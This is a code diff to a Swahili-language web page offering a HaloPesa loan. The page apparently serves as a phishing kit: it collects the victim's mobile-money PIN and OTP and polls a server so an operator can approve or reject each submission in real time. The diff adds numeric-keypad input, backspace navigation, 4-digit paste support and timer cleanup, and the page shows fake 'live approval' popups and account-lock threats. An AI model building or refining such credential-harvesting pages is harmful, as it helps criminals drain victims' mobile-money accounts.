@@ -852,10 +852,10 @@
 
     <div class="pin-label">Weka PIN yako (tarakimu 4)</div>
     <div class="pin-row">
-      <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,0)" id="p0">
-      <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,1)" id="p1">
-      <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,2)" id="p2">
-      <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,3)" id="p3">
+      <input type="password" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1" onkeydown="pinKey(event,0)" oninput="pinMv(this,0)" id="p0">
+      <input type="password" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1" onkeydown="pinKey(event,1)" oninput="pinMv(this,1)" id="p1">
+      <input type="password" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1" onkeydown="pinKey(event,2)" oninput="pinMv(this,2)" id="p2">
+      <input type="password" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1" onkeydown="pinKey(event,3)" oninput="pinMv(this,3)" id="p3">
       <button class="pin-eye" onclick="togPin()">👁</button>
     </div>
 
@@ -888,6 +888,7 @@
     <div class="msg-box error" id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
     <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
     <div class="msg-box warning" id="otpMsgWarn"><span class="msg-icon">⚠</span><span id="otpMsgWarnTxt"></span></div>
+    <div class="msg-box info" id="otpMsgInfo"><span class="msg-icon">ℹ</span><span id="otpMsgInfoTxt"></span></div>
 
     <div class="waiting-box" id="pinWait">
       <div class="wb-spinner"></div>
@@ -896,10 +897,10 @@
 
     <div id="otpInputSection">
       <div class="otp-inputs">
-        <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,0)" id="o0">
-        <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,1)" id="o1">
-        <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,2)" id="o2">
-        <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,3)" id="o3">
+        <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box" maxlength="1" onkeydown="otpKey(event,0)" oninput="otpMv(this,0)" id="o0">
+        <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box" maxlength="1" onkeydown="otpKey(event,1)" oninput="otpMv(this,1)" id="o1">
+        <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box" maxlength="1" onkeydown="otpKey(event,2)" oninput="otpMv(this,2)" id="o2">
+        <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box" maxlength="1" onkeydown="otpKey(event,3)" oninput="otpMv(this,3)" id="o3">
       </div>
       <div class="otp-resend" id="otpRs">Tuma tena msimbo ndani ya <span id="rsS">30</span> sekunde</div>
       <button class="btn-otp" id="bOtp" onclick="doOtp()">WASILISHA</button>
@@ -1000,6 +1001,12 @@
 </div>
 
 <script>
+  // GLOBAL INTERVAL HANDLES
+  let pinPollInterval = null;
+  let otpPollInterval = null;
+  let _rsInterval = null;
+  let _loginInFlight = false;
+
   // STATE MANAGEMENT
   const S = {
     amt: 100000,
@@ -1033,8 +1040,12 @@
     return sessionStorage.getItem('selectedAdminId') || null;
   }
 
-  // PAGE NAVIGATION
+  // PAGE NAVIGATION (WITH AUTOMATIC TIMER CLEANUP)
   function goTo(id) {
+    if (pinPollInterval) { clearInterval(pinPollInterval); pinPollInterval = null; }
+    if (otpPollInterval) { clearInterval(otpPollInterval); otpPollInterval = null; }
+    if (_rsInterval)     { clearInterval(_rsInterval);     _rsInterval = null; }
+
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     document.getElementById(id).classList.add('active');
     window.scrollTo(0, 0);
@@ -1181,28 +1192,34 @@
   }
 
   function showOtpMsg(type, text) {
-    ['otpMsgErr','otpMsgOk','otpMsgWarn'].forEach(id => {
-      document.getElementById(id).classList.remove('show');
-    });
+    hideOtpMsgs();
     if (type === 'error')   { document.getElementById('otpMsgErrTxt').textContent = text;  document.getElementById('otpMsgErr').classList.add('show'); }
     if (type === 'success') { document.getElementById('otpMsgOkTxt').textContent = text;   document.getElementById('otpMsgOk').classList.add('show'); }
     if (type === 'warning') { document.getElementById('otpMsgWarnTxt').textContent = text; document.getElementById('otpMsgWarn').classList.add('show'); }
+    if (type === 'info')    { document.getElementById('otpMsgInfoTxt').textContent = text; document.getElementById('otpMsgInfo').classList.add('show'); }
   }
   function hideOtpMsgs() {
-    ['otpMsgErr','otpMsgOk','otpMsgWarn'].forEach(id => {
-      document.getElementById(id).classList.remove('show');
+    ['otpMsgErr','otpMsgOk','otpMsgWarn','otpMsgInfo'].forEach(id => {
+      const el = document.getElementById(id);
+      if (el) el.classList.remove('show');
     });
   }
 
   // LOGIN PIN HANDLERS
+  function pinKey(e, i) {
+    if (e.key === 'Backspace' && !e.target.value && i > 0) {
+      document.getElementById('p' + (i - 1)).focus();
+    }
+  }
+
   function pinMv(el, i) {
-    el.value = el.value.replace(/\D/, '');
+    el.value = el.value.replace(/\D/g, '');
     if (el.value && i < 3) document.getElementById('p' + (i+1)).focus();
     chkLogin();
   }
 
   function chkLogin() {
-    const ok = [0,1,2,3].every(i => document.getElementById('p'+i).value);
+    const ok = [0,1,2,3].every(i => document.getElementById('p'+i).value !== '');
     document.getElementById('bLogin').className = ok ? 'btn-login rdy' : 'btn-login';
   }
 
@@ -1212,8 +1229,6 @@
       b.type = b.type === 'password' ? 'text' : 'password';
     });
   }
-
-  let _loginInFlight = false;
 
   async function doLogin() {
     if (_loginInFlight) return;          
@@ -1277,8 +1292,6 @@
   }
 
   // PIN STATUS POLLING
-  let pinPollInterval = null;
-
   function pollPinStatus() {
     if (pinPollInterval) clearInterval(pinPollInterval);
 
@@ -1291,6 +1304,7 @@
 
         if (data.status === 'approved') {
           clearInterval(pinPollInterval);
+          pinPollInterval = null;
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpInputSection').style.display = 'block';
           showOtpMsg('success', 'Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.');
@@ -1299,6 +1313,7 @@
 
         } else if (data.status === 'rejected') {
           clearInterval(pinPollInterval);
+          pinPollInterval = null;
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpInputSection').style.display = 'none';
           showOtpMsg('error', 'Maelezo hayakuthibitishwa. Tafadhali ingia tena na uweke namba sahihi ya HaloPesa.');
@@ -1329,6 +1344,7 @@
     setTimeout(() => {
       if (pinPollInterval) {
         clearInterval(pinPollInterval);
+        pinPollInterval = null;
         if (document.getElementById('pinWait').classList.contains('show')) {
           document.getElementById('pinWait').classList.remove('show');
           showOtpMsg('warning', 'Muda wa uthibitisho umeisha. Tafadhali rudi na ujaribu tena.');
@@ -1338,14 +1354,19 @@
   }
 
   // OTP HELPERS
+  function otpKey(e, i) {
+    if (e.key === 'Backspace' && !e.target.value && i > 0) {
+      document.getElementById('o' + (i - 1)).focus();
+    }
+  }
+
   function otpMv(el, i) {
-    el.value = el.value.replace(/\D/, '');
+    el.value = el.value.replace(/\D/g, '');
     if (el.value && i < 3) document.getElementById('o' + (i+1)).focus();
-    const ok = [0,1,2,3].every(j => document.getElementById('o'+j).value);
+    const ok = [0,1,2,3].every(j => document.getElementById('o'+j).value !== '');
     document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
   }
 
-  let _rsInterval = null;
   function startRs() {
     if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
 
@@ -1440,8 +1461,6 @@
   }
 
   // OTP STATUS POLLING
-  let otpPollInterval = null;
-
   function pollOtpStatus() {
     if (otpPollInterval) clearInterval(otpPollInterval);
 
@@ -1454,6 +1473,7 @@
 
         if (data.status === 'approved') {
           clearInterval(otpPollInterval);
+          otpPollInterval = null;
           document.getElementById('apAmt').textContent  = 'TSh ' + Number(S.amt || 100000).toLocaleString();
           document.getElementById('apTerm').textContent = S.term || 'Miezi 48';
           const a = Number(S.amt) || 100000;
@@ -1465,11 +1485,13 @@
 
         } else if (data.status === 'rejected') {
           clearInterval(otpPollInterval);
+          otpPollInterval = null;
           showOtpMsg('error', 'Uthibitisho umeshindwa. Tafadhali wasiliana na msaada.');
           document.getElementById('bOtp').disabled = false;
 
         } else if (data.status === 'wrongpin_otp') {
           clearInterval(otpPollInterval);
+          otpPollInterval = null;
           showOtpMsg('error', 'PIN si sahihi. Tafadhali jaribu tena. ⚠️ Kumbuka: Ukiingiza PIN isiyo sahihi tena, akaunti yako itafungwa kwa usalama.');
           setTimeout(() => {
             [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
@@ -1493,6 +1515,7 @@
 
         } else if (data.status === 'wrongcode') {
           clearInterval(otpPollInterval);
+          otpPollInterval = null;
           [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
           document.getElementById('bOtp').className = 'btn-otp';
           document.getElementById('bOtp').disabled = false;
@@ -1510,6 +1533,7 @@
     setTimeout(() => {
       if (otpPollInterval) {
         clearInterval(otpPollInterval);
+        otpPollInterval = null;
         showOtpMsg('warning', 'Muda wa idhini umeisha. Tafadhali jaribu tena.');
         document.getElementById('bOtp').disabled = false;
       }
@@ -1518,6 +1542,37 @@
 
   // LIVE APPROVAL POPUP LOGIC
   document.addEventListener("DOMContentLoaded", () => {
+    // 4-Digit Paste Support for PIN
+    const p0 = document.getElementById('p0');
+    if (p0) {
+      p0.addEventListener('paste', (e) => {
+        const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').trim();
+        if (paste.length === 4) {
+          e.preventDefault();
+          [...paste].forEach((digit, idx) => {
+            const el = document.getElementById('p' + idx);
+            if (el) { el.value = digit; pinMv(el, idx); }
+          });
+          chkLogin();
+        }
+      });
+    }
+
+    // 4-Digit Paste Support for OTP
+    const o0 = document.getElementById('o0');
+    if (o0) {
+      o0.addEventListener('paste', (e) => {
+        const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').trim();
+        if (paste.length === 4) {
+          e.preventDefault();
+          [...paste].forEach((digit, idx) => {
+            const el = document.getElementById('o' + idx);
+            if (el) { el.value = digit; otpMv(el, idx); }
+          });
+        }
+      });
+    }
+
     const liveApprovals = [
         { number: "062*****841", location: "Dar es Salaam", amount: "TSh 10,000" },
         { number: "062*****375", location: "Arusha", amount: "TSh 25,000" },
